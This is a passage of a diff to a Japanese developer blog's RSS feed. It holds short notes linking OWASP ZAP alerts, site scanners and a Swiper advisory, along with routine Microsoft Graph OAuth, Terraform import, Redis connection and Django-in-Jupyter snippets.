+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10096/"&gt;Timestamp Disclosure - Unix&lt;/a&gt; [10096]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10109/"&gt;Modern Web Application&lt;/a&gt; [10109] (対応しなくてもよい)&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10110/"&gt;Dangerous JS Functions&lt;/a&gt; [10110]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10112/"&gt;Session Management Response Identified&lt;/a&gt; [10112]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/10202/"&gt;Absence of Anti-CSRF Tokens&lt;/a&gt; [10202]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/90003/"&gt;Sub Resource Integrity Attribute Missing&lt;/a&gt; [90003]&lt;/li&gt;
+&lt;li&gt;: &lt;a href="https://www.zaproxy.org/docs/alerts/90011/"&gt;Charset Mismatch&lt;/a&gt; [90011]&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="virustotal"&gt;VIRUSTOTAL&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.virustotal.com/gui/home/upload"&gt;https://www.virustotal.com/gui/home/upload&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="suuri"&gt;SUURI&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://sitecheck.sucuri.net/"&gt;https://sitecheck.sucuri.net/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>Swiper</title><link>https://hdknr.github.io/blogs/posts/2024/07/4b9123e748fa907fcd28b131e7b8c2ac/</link><pubDate>Mon, 15 Jul 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/07/4b9123e748fa907fcd28b131e7b8c2ac/</guid><description>&lt;h1 id="swiper"&gt;swiper&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://github.com/nolimits4web/swiper"&gt;https://github.com/nolimits4web/swiper&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://b-risk.jp/blog/2022/04/swiper/"&gt;【最新】Swiper の使い方・カスタマイズを解説！サンプルやオプション 15 個付き ー基礎から応用までー&lt;/a&gt; (Swiper v8.1.4)&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://jvndb.jvn.jp/ja/contents/2021/JVNDB-2021-005554.html"&gt;JVNDB-2021-005554 swiper における脆弱性&lt;/a&gt; (6.5.1)(情報を取得される、情報を改ざんされる、およびサービス運用妨害 (DoS) 状態にされる可能性があります。)&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>MS Graph</title><link>https://hdknr.github.io/blogs/posts/2024/06/c128e87472c9102267c685f6b489c0ea/</link><pubDate>Sun, 02 Jun 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/06/c128e87472c9102267c685f6b489c0ea/</guid><description>&lt;h1 id="micsoft-graph"&gt;Micsoft Graph&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://qiita.com/kenakamu/items/6a1ca508dc093779eefa"&gt;Microsoft Graph を使ってみよう : 目次&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://qiita.com/hidehito108/items/35e7f8c5144efabd3a8a"&gt;Microsoft Graph を 標準 Java で使う&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="oauth2"&gt;OAuth2&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;client_credtials&lt;/code&gt;:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;curl -d &lt;span style="color:#e6db74"&gt;&amp;#34;client_id=クライアントID&amp;#34;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -d &lt;span style="color:#e6db74"&gt;&amp;#34;scope=https%3A%2F%2Fgraph.microsoft.com%2F.default&amp;#34;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -d &lt;span style="color:#e6db74"&gt;&amp;#34;client_secret=クライアントシークレット&amp;#34;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -d &lt;span style="color:#e6db74"&gt;&amp;#34;grant_type=client_credentials&amp;#34;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -H &lt;span style="color:#e6db74"&gt;&amp;#34;Content-Type: application/x-www-form-urlencoded&amp;#34;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; -X POST https://login.microsoftonline.com/テナントID/oauth2/v2.0/token
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;authorization code&lt;/code&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://qiita.com/kazama1209/items/7d9118fe74a15ddd1769"&gt;Microsoft Graph API を Ruby で操作してみる&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>AWS: Billing</title><link>https://hdknr.github.io/blogs/posts/2024/04/842a561c7af98ea5873d73c662da6b25/</link><pubDate>Mon, 08 Apr 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/04/842a561c7af98ea5873d73c662da6b25/</guid><description>&lt;h1 id="aws-billing"&gt;AWS: Billing&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://dev.classmethod.jp/articles/aws-1st-step-new-era-reiwa/"&gt;AWS アカウントを作ったら最初にやるべきこと ～令和元年版～&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://qiita.com/tmknom/items/303db2d1d928db720888"&gt;AWS アカウントを取得したら速攻でやっておくべき初期設定まとめ&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://tech.nri-net.com/entry/aws_first_security"&gt;AWS アカウント作成時にやるべきこと&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://dev.classmethod.jp/articles/cost-check-point/"&gt;無駄なコストを省こう！AWS で消し忘れを防止するためにチェックすべき７つのポイント&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description></item><item><title>Terraform: Import</title><link>https://hdknr.github.io/blogs/posts/2024/01/ce515ed27e64e9a60e361eb531f7efca/</link><pubDate>Sun, 07 Jan 2024 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2024/01/ce515ed27e64e9a60e361eb531f7efca/</guid><description>&lt;h1 id="terrafrom-import"&gt;Terrafrom Import&lt;/h1&gt;
+&lt;h2 id="ドメイン認証"&gt;ドメイン認証&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# env $(cat ../.env|xargs) terraform -chdir=prod import &amp;#39;module.ses.aws_route53_record.domain_identity[&amp;#34;yourdomain.com&amp;#34;]&amp;#39; Z01825913VYOI2NNQZL0A__amazonses.yourdomain.com_TXT&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="s3"&gt;S3&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;export RES&lt;span style="color:#f92672"&gt;=&lt;/span&gt;module.s3_backup.aws_s3_bucket.this
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;export BUCKET&lt;span style="color:#f92672"&gt;=&lt;/span&gt;mybucket-prod
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;env &lt;span style="color:#66d9ef"&gt;$(&lt;/span&gt;cat ../.env|xargs&lt;span style="color:#66d9ef"&gt;)&lt;/span&gt; terraform -chdir&lt;span style="color:#f92672"&gt;=&lt;/span&gt;prod import $RES $BUKET
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description></item><item><title>redis</title><link>https://hdknr.github.io/blogs/posts/2023/07/0e2885fa164ec64417cf750beafb9e04/</link><pubDate>Fri, 14 Jul 2023 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2023/07/0e2885fa164ec64417cf750beafb9e04/</guid><description>&lt;h1 id="elasic-cache-for-redis"&gt;Elasic Cache for Redis&lt;/h1&gt;
+&lt;h2 id="バージョン"&gt;バージョン&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ redis-cli --version
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;redis-cli 5.0.7
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ redis-server -v
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;Redis server v&lt;span style="color:#f92672"&gt;=&lt;/span&gt;5.0.7 sha&lt;span style="color:#f92672"&gt;=&lt;/span&gt;00000000:0 malloc&lt;span style="color:#f92672"&gt;=&lt;/span&gt;jemalloc-5.2.1 bits&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;64&lt;/span&gt; build&lt;span style="color:#f92672"&gt;=&lt;/span&gt;66bd629f924ac924
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;接続:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-ini" data-lang="ini"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;REDIS_URL&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;redis://mycloud-stage-redis-nc.sigrvp.ng.0001.apne1.cache.amazonaws.com:6379/0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ export &lt;span style="color:#66d9ef"&gt;$(&lt;/span&gt;cat .env|xargs&lt;span style="color:#66d9ef"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$ redis-cli -u $REDIS_URL PING
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;PONG
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="python"&gt;Python&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;redis-py&lt;/code&gt;: &lt;a href="https://github.com/redis/redis-py"&gt;https://github.com/redis/redis-py&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;django-redis&lt;/code&gt;: &lt;a href="https://github.com/jazzband/django-redis"&gt;https://github.com/jazzband/django-redis&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;channels_redis&lt;/code&gt;: &lt;a href="https://github.com/django/channels_redis"&gt;https://github.com/django/channels_redis&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="クラスターモードへの接続"&gt;クラスターモードへの接続&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://redis.readthedocs.io/en/stable/connections.html#cluster-client"&gt;Cluster Client&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-py" data-lang="py"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; logging
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; redis.cluster &lt;span style="color:#f92672"&gt;import&lt;/span&gt; RedisCluster
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;ENDPOINT &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;mycloud-stage-redis-test.sigrvp.clustercfg.apne1.cache.amazonaws.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;logging&lt;span style="color:#f92672"&gt;.&lt;/span&gt;basicConfig(level&lt;span style="color:#f92672"&gt;=&lt;/span&gt;logging&lt;span style="color:#f92672"&gt;.&lt;/span&gt;INFO)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;redis &lt;span style="color:#f92672"&gt;=&lt;/span&gt; RedisCluster(host&lt;span style="color:#f92672"&gt;=&lt;/span&gt;ENDPOINT, port&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;6379&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; redis&lt;span style="color:#f92672"&gt;.&lt;/span&gt;ping():
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; logging&lt;span style="color:#f92672"&gt;.&lt;/span&gt;info(&lt;span style="color:#e6db74"&gt;&amp;#34;Connected to Redis&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;django-redis:&lt;/p&gt;</description></item><item><title>jupyter: Django</title><link>https://hdknr.github.io/blogs/posts/2023/05/fc7ee4d1b91d841dd9955ac611e3af2d/</link><pubDate>Fri, 05 May 2023 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2023/05/fc7ee4d1b91d841dd9955ac611e3af2d/</guid><description>&lt;h2 id="jupyter-django"&gt;Jupyter: Django&lt;/h2&gt;
+&lt;h3 id="準備"&gt;準備&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;django_extensions , notebookを入れておく&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;settgins.py:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-py" data-lang="py"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;INSTALLED_APPS &lt;span style="color:#f92672"&gt;+=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;django_extensions&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id="vscode"&gt;VSCode&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;VSCodeでJupyterのPythonランタイムを選んでから以下を実行する&lt;/li&gt;
+&lt;li&gt;環境変数で、&lt;code&gt;DJANGO_ALLOW_ASYNC_UNSAFE=true&lt;/code&gt; をセットしておく(.envとか)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
